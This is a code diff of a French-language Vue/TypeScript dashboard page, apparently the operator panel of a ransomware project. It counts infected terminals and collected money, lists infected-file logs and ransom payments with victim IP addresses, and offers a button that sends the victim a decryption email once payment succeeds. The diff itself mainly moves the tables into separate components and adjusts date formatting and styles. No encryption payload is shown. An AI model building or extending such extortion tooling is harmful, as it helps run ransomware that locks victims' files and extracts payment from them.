@@ -20,59 +20,25 @@
             <div>
                 <div class="card paragraphe">
                     <div class="grid">
-                        <div>
+                        <div class="card-statistics">
                             <p class="text-center medium">
                                 Terminaux&nbsp;infectés&nbsp;
                             </p>
                             <h2 class="text-danger text-center large">{{ infectedTerminals }}</h2>
-                            <p class="text-amber text-center small">{{ moment(new Date()).format("L HH:mm") }}</p>
+                            <p class="text-amber text-center small">au {{ $moment(new Date()).format("LLL") }}</p>
                         </div>
-                        <div>
+                        <div class="card-statistics">
                             <p class="text-center medium">
                                 Sous-sous dans les po-poches
                             </p>
                             <h2 class="text-danger text-center large">{{ totalAmount }} €</h2>
-                            <p class="text-amber text-center small">{{ moment(new Date()).format("L HH:mm") }}</p>
+                            <p class="text-amber text-center small">au {{ $moment(new Date()).format("LLL") }}</p>
                         </div>
                     </div>
                 </div>
                 <div class="grid">
-                    <stat-card v-if="infectedFiles.length > 0">
-                        <table>
-                            <tr v-for="log in infectedFiles" class="paragraphe small">
-                                <td>
-                                    <span class="text-amber">{{ moment(log.createdAt).format("L HH:mm") }}</span>&nbsp;-&nbsp;
-                                </td>
-                                <td>
-                                    <span class="text-danger">{{ log.numberInfectedFile }}</span>&nbsp;fichiers&nbsp;infectés
-                                </td>
-                                <td>
-                                    &nbsp;&nbsp;ip:&nbsp;<span class="text-success">{{ log.ip }}</span>
-                                </td>
-                            </tr>
-                        </table>
-                    </stat-card>
-                    <stat-card v-if="payments.length > 0">
-                        <table>
-                            <tr v-for="log in payments" class="paragraphe small">
-                                <td>
-                                    <span class="text-amber">{{ moment(log.createdAt).format("L HH:mm") }}</span>&nbsp;-&nbsp;
-                                </td>
-                                <td>
-                                    paiement de <span class="text-danger">{{ log.amount }}&nbsp;€</span>
-                                </td>
-                                <td>
-                                    &nbsp;&nbsp;ip:&nbsp;<span class="text-success">{{ log.user.ip }}</span>
-                                </td>
-                                <td>
-                                    <p v-if="log.paymentStatus === 'payment_success'">
-                                        <button class="action-button btn-small dashboard medium" @click.prevent="sendEmail(token, log.id)">Décrypter les fichiers de l'utilisateur</button>
-                                    </p>
-                                    <p v-if="log.paymentStatus === 'files_decrypted'" class="flash flash--success btn-small dashboard medium">Transaction terminée</p>
-                                </td>
-                            </tr>
-                        </table>
-                    </stat-card>
+                    <InfectedFileStat :infectedFiles="infectedFiles" />
+                    <PaymentStat :payments="payments" @clickHandler="sendEmail"/>
                 </div>
             </div>
 
@@ -86,9 +52,9 @@ import {defineComponent} from 'vue';
 import Header from '../components/commons/Header.vue';
 import HttpRequest from '../core/services/http/HttpRequest';
 import {isAdmin, isLogged, isTokenExpired} from '../core/services/utils/auth';
-import StatCard from "../components/stats/StatCard.vue";
-import moment from 'moment'
 import FlashMessage from "../components/FlashMessage.vue";
+import PaymentStat from "../components/stats/PaymentStat.vue";
+import InfectedFileStat from "../components/stats/InfectedFileStat.vue";
 
 export default defineComponent({
     name: 'Home',
@@ -96,11 +62,10 @@ export default defineComponent({
         return {
             error: null as string | null,
             token: isLogged(),
-            infectedFiles: [],
-            payments: [],
+            infectedFiles: [] as any[],
+            payments: [] as any[],
             infectedTerminals: 0,
             totalAmount: 0,
-            moment: moment,
             email: {
                 message: null as string | null,
                 error: null as string | null
@@ -108,9 +73,10 @@ export default defineComponent({
         }
     },
     components: {
+        InfectedFileStat,
+        PaymentStat,
         FlashMessage,
-        Header,
-        StatCard
+        Header
     },
     methods: {
         call(token: string | null): void {
@@ -128,21 +94,20 @@ export default defineComponent({
                     this.error = error;
                 });
         },
-        sendEmail(token: string | null, id: number): void {
-            HttpRequest.get('/api/decrypt/'+id, token)
-                .then((res: any) => {
+        sendEmail(id: number) {
+            HttpRequest.get('/api/send_decrypt_email/'+id, this.token)
+                .then((res) => {
                     if(res.data.error) {
                         this.email.error = res.data.message;
                     } else {
                         this.email.message = res.data.message
                     }
-                }).catch((error: any) => {
-                    this.email.error = error;
-                });
+                }).catch((error) => {
+                this.email.error = error;
+            });
         }
     },
     created() {
-
         if (this.token) {
             isTokenExpired(this.token);
             if(!isAdmin(this.token)) {
@@ -158,5 +123,10 @@ export default defineComponent({
 </script>
 
 <style lang="scss" scoped>
-// Your scoped scss
+ .card-statistics:not(:first-child) {
+     margin-left: 2rem;
+ }
+ .card-statistics:not(:last-child) {
+      margin-right: 2rem;
+  }
 </style>
